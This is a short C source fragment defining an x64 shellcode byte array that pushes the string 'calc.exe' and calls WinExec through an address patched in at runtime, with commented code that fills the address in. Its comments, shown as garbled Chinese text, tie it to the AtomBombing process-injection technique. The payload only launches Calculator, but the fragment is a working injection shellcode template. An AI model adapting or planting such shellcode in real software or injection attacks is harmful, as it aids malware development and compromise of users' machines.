
// ���������calc��shellcode��������00 00 ���µ�shellcode�жϣ��״�ʹ����atombombing
unsigned char shellcode[] = {
    // ����"calc.exe"�ַ�����ջ��
    0x48, 0x31, 0xC0,               // xor rax, rax
    0x50,                           // push rax        ; null terminator
    0x68, 0x2E, 0x65, 0x78, 0x65,   // push "exe."
    0x68, 0x63, 0x61, 0x6C, 0x63,   // push "calc"

    // ���ò���������
    0x48, 0x89, 0xE1,               // mov rcx, rsp    ; ��һ������
    0x6A, 0x01,                     // push 1          ; SW_SHOWNORMAL
    0x5A,                           // pop rdx         ; �ڶ�������

    // ����WinExec
    0x48, 0xB8,                     // mov rax,
    0xEF, 0xBE, 0xAD, 0xDE,        // WinExec��ַ
    0xEF, 0xBE, 0xAD, 0xDE,        // (��Ҫ���)
    0x48, 0xF7, 0xD0,               // not rax
    0xFF, 0xD0                      // call rax
};

/*
     HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    UINT64 WinExecAddr = (UINT64)GetProcAddress(hKernel32, "WinExec");

    // ���WinExec��ַ
    *(UINT64*)(shellcode + 22) = ~WinExecAddr;
*/